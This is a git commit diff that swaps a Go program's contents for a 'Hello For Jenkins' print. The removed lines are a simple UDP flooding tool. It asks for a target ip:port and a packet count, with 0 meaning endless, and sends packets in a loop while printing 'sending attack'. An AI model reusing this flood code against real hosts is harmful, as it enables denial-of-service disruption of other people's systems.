2cdb50f9ccef1840183299d96d29938b4ba9628b
Mikhael <111277834+mikhaeljhon22@users.noreply.github.com>
2025-11-16 07:18:32 +0700

    Update main.go

--- main.go
+++ main.go
@@ -1,39 +1,9 @@
 package main
-
+// code is maintenance
 import (
 	"fmt"
-	"net"
-	"sync"
 )
 
 func main() {
-	var wg sync.WaitGroup
-	wg.Add(1)
-	go func() {
-		var ip string
-		var count int
-		fmt.Print("Type your ip:port target :")
-		fmt.Scan(&ip)
-		fmt.Print("Type count request (0 for infinity) :")
-		fmt.Scan(&count)
-		conn, err := net.Dial("udp", ip)
-
-		if err != nil {
-			fmt.Println(err)
-		}
-		if count == 0 {
-			for {
-				conn.Write([]byte("send udp"))
-				fmt.Println("sending attack")
-			}
-		} else {
-			for i := 0; i <= count; i++ {
-				conn.Write([]byte("send udp"))
-				fmt.Println(i, "sending attack")
-			}
-		}
-		wg.Done()
-	}()
-
-	wg.Wait()
+	fmt.Println("Hello For Jenkins")
 }
